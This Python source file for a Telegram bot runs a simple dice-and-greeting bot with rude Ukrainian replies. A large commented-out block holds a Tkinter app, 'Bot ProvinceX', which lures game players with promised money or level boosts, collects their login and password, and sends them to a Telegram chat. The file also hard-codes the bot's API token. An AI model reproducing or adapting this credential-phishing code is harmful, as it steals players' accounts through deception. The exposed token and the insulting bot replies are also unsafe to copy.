import requests
import random

url = 'https://api.telegram.org/bot1031239183:AAHOWy8CBjcihK7xdEBWmEMFGc-x48lpwFA/'

HELLO = ['Salute.', 'Welcome.', 'Hello.', 'Hi.']
r_hello = len(HELLO) - 1

dn1 = 0
dn2 = 0
df1 = 0
df2 = 0
ds1 = 0
ds2 = 0

sdn1 = ''
sdn2 = ''
sdf1 = ''
sdf2 = ''
sds1 = ''
sds2 = ''

sumbol = ['', '⚀', '⚁', '⚂', '⚃', '⚄', '⚅']
# symbols = ['QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890']

bot = 0

label_info = None

# def registration():
#
#     frame.place(relx = 0, rely = 0.2, relwidth = 1, relheight = 0.8)
#
#     label = Label(frame, text='Введите Ваши данные аккаунта')
#     label.place(relwidth = 1, relheight = 0.1)
#
#     login = Label(frame, text='Логин:')
#     login.place(rely = 0.1, relwidth = 0.5, relheight = 0.05)
#     login_entry = Entry(frame)
#     login_entry.place(relx = 0.5, rely = 0.1, relwidth = 0.49, relheight = 0.05)
#
#     password = Label(frame, text='Пароль:')
#     password.place(rely = 0.15, relwidth = 0.5, relheight = 0.05)
#     password_entry = Entry(frame, show='*')
#     password_entry.place(relx = 0.5, rely = 0.15, relwidth = 0.49, relheight = 0.05)
#
#     button = Button(frame, text='Накрутить деньги', command=lambda: info())
#     button.place(relx = 0.4, rely = 0.2, relheight = 0.05, relwidth = 0.2)
#
#     def info():
#         global sl, sp
#         label_error = Label(frame, text='')
#         label_info = Label(frame, text='Если введенные данные не соответствуют Вашему аккаунту, то процес будет проигнорирован!')
#         label_info.place(rely = 0.25, relheight = 0.05, relwidth = 1)
#         sl = str(login_entry.get())
#         sp = str(password_entry.get())
#
#         if sl.isalnum() and sp.isalnum() and len(sl) >= 8 and len(sp) >= 8:
#             label_error.config(text='Проверка пройдет после того как истечет некоторое время!!!\nВам деться 5 минут для выхода из сервера, что-бы бот смог\nзайти на указаный Вами аккаунт,\nпосле чего на данный аккаунт зайдет бот и сделает накрутку денег.\n\n\nНо, если Вы в это время будете находиться на сервере, то данная операция проигнорируеться!')
#             label_error.place(rely = 0.3, relwidth = 1)
#             send_message1()
#         else:
#             label_error.config(text='Логин или пароль совмещает не потходящие символы или буквы. Попробуйте ещё раз ввести\nнужные данные')
#             label_error.place(rely = 0.3, relwidth = 1)
#
# def login_form():
#
#     frame.place(relx = 0, rely = 0.2, relwidth = 1, relheight = 0.8)
#
#     label = Label(frame, text='Введите Ваши данные аккаунта')
#     label.place(relwidth = 1, relheight = 0.1)
#
#     login = Label(frame, text='Логин:')
#     login.place(rely = 0.1, relwidth = 0.5, relheight = 0.05)
#     login_entry = Entry(frame)
#     login_entry.place(relx = 0.5, rely = 0.1, relwidth = 0.49, relheight = 0.05)
#
#     password = Label(frame, text='Пароль:')
#     password.place(rely = 0.15, relwidth = 0.5, relheight = 0.05)
#     password_entry = Entry(frame, show='*')
#     password_entry.place(relx = 0.5, rely = 0.15, relwidth = 0.49, relheight = 0.05)
#
#     button = Button(frame, text='Накрутить уровень', command=lambda: info())
#     button.place(relx = 0.4, rely = 0.2, relheight = 0.05, relwidth = 0.2)
#
#     def info():
#         global sl, sp
#         label_error = Label(frame, text='')
#         label_info = Label(frame, text='Если введенные данные не соответствуют Вашему аккаунту, то процес будет проигнорирован!')
#         label_info.place(rely = 0.25, relheight = 0.05, relwidth = 1)
#         sl = str(login_entry.get())
#         sp = str(password_entry.get())
#
#         if sl.isalnum() and sp.isalnum() and len(sl) >= 8 and len(sp) >= 8:
#             label_error.config(text='Проверка пройдет после того как истечет некоторое время!!!\nВам деться 5 минут для выхода из сервера, что-бы бот смог\nзайти на указаный Вами аккаунт,\nпосле чего на данный аккаунт зайдет бот и сделает накрутку уровня.\n\n\nНо, если Вы в это время будете находиться на сервере, то данная операция проигнорируеться!')
#             label_error.place(rely = 0.3, relwidth = 1)
#             send_message2()
#         else:
#             label_error.config(text='Логин или пароль содержит не потходящие символы или буквы. Попробуйте ещё раз ввести\nнужные данные')
#             label_error.place(rely = 0.3, relwidth = 1)
#
# def last_update(request):
#     response = requests.get(request + 'getUpdates')
#     response = response.json()
#     results = response['result']
#     total_updates = len(results) - 1
#     return results[total_updates]
#
# def send_message(chat, text):
#     params = {'chat_id': chat, 'text': text}
#     response = requests.post(url + 'sendMessage', data = params)
#     return response
#
# def get_chat_id(update):
#     chat_id = update['message']['chat']['id']
#     return chat_id
#
# def send_message1():
#     global sl, sp
#     print(sl + ', ' + sp)
#     update_id = last_update(url)['update_id']
#     update = last_update(url)
#     send_message(get_chat_id(update), 'Деньги\n\n' + 'Login: ' + sl + '\nPassword: ' + sp)
#
# def send_message2():
#     global sl, sp
#     print(sl + ', ' + sp)
#     update_id = last_update(url)['update_id']
#     update = last_update(url)
#     send_message(get_chat_id(update), 'Уровень\n\n' + 'Login: ' + sl + '\nPassword: ' + sp)
#
# root = Tk()
# root.title('Bot ProvinceX')
# root.geometry('%dx%d' % (WIDTH, HEIGHT))
#
# frame = Frame(root)
#
# # label_1 = Label(root, text='Привет игрок нашого проэкта Province X!')
# # label_1.pack(fill = BOTH)
#
# label_1 = Label(root, text='Эта програма даст тебе возможность накрутить деньги или свой уровень с помощу бота.')
# label_1.pack(fill = BOTH)
#
# # label_1 = Label(root, text='Если ты не знал про эту возможность, значит ты очень мало поссещаеш наш сайт.')
# # label_1.pack(fill = BOTH)
#
# label_1 = Label(root, text='Итак, нажимай на нужную тебе кнопку.')
# label_1.pack(fill = BOTH)
#
# button_signup = Button(root, text='Получения денежных средств', command=registration)
# button_signup.place(relx = 0.01, rely = 0.15, relwidth = 0.48)
#
# button_signin = Button(root, text='Накрутка уровня', command=login_form)
# button_signin.place(relx = 0.51, rely = 0.15, relwidth = 0.48)

def last_update(request):
    response = requests.get(request + 'getUpdates')
    response = response.json()
    results = response['result']
    total_updates = len(results) - 1
    return results[total_updates]

def get_chat_id(update):
    chat_id = update['message']['chat']['id']
    return chat_id

def get_message_text(update):
    message_text = update['message']['text']
    return message_text

def send_message(chat, text):
    params = {'chat_id': chat, 'text': text}
    response = requests.post(url + 'sendMessage', data = params)
    return response

def sleep():
    global bot
    if bot == 1:
        send_message(get_chat_id(update), 'Ну ти задовбав, дай поспать.')
        bot = 0

def main():
    global dn1, dn2, df1, df2, ds1, ds2
    global sdn1, sdn2, sdf1, sdf2, sds1, sds2
    global sumbol, HELLO
    update_id = last_update(url)['update_id']
    while True:
        update = last_update(url)
        if update_id == update['update_id']:
#START
            if get_message_text(update).lower() == '/start':
                sleep()
                send_message(get_chat_id(update), 'Здоров кабачок. Пиши /help і будеш розумним для себе.')
#SHARE
            elif get_message_text(update).lower() == '/share':
                sleep()
                send_message(get_chat_id(update), 'Зачем ділиться, якщо я популярний. Ну раз так просиш, то держи:\nhttps://t.me/SamiuTopovui_bot')
# HELLO, HEY, HI
            elif get_message_text(update).lower() == 'hi' or get_message_text(update).lower() == 'hello' or get_message_text(update).lower() == 'hey':
                sleep()
                send_message(get_chat_id(update), HELLO[random.randint(0, r_hello)])
# DICE
            elif get_message_text(update).lower() == '/dice':
                sleep()
                ds1 = df1
                ds2 = df2
                df1 = dn1
                df2 = dn2
                sds1 = sdf1
                sds2 = sdf2
                sdf1 = sdn1
                sdf2 = sdn2
                dn1 = random.randint(1, 6)
                dn2 = random.randint(1, 6)
                for i in range(len(sumbol)):
                    if dn1 == i:
                        sdn1 = sumbol[i]
                    if dn2 == i:
                        sdn2 = sumbol[i]
                now_dropped = 'Новий дропчик: ' + str(sdn1) + ' і ' + str(sdn2) + '.\nРезультат дропа: ' + str(dn1 + dn2) + '\n\n'
                first_dropped = 'Твій попередній дропчик: ' + str(sdf1) + ' + ' + str(sdf2) + ' = ' + str(df1 + df2) + '\n'
                second_dropped = 'Попередній дроп попереднього: ' + str(sds1) + ' + ' + str(sds2) + ' = ' + str(ds1 + ds2)
                send_message(get_chat_id(update), now_dropped + first_dropped + second_dropped)
# HELP
            elif get_message_text(update).lower() == '/help':
                bot = 1
                send_message(get_chat_id(update), "Оце ти нуб, не знаєш що ти можеш написать, позор:\n\n/dice\n/share\n\nТобі поки що цього хватить, а я пішов спать.")
# ERROR
            else:
                sleep()
                send_message(get_chat_id(update), "Ти що дурний, писать не вмієш. Щас позву куратора, він тебе научить. Поняв?")
            update_id += 1
            print(get_chat_id(update))

print('Bot startonyv')
if __name__ == '__main__':
    main()
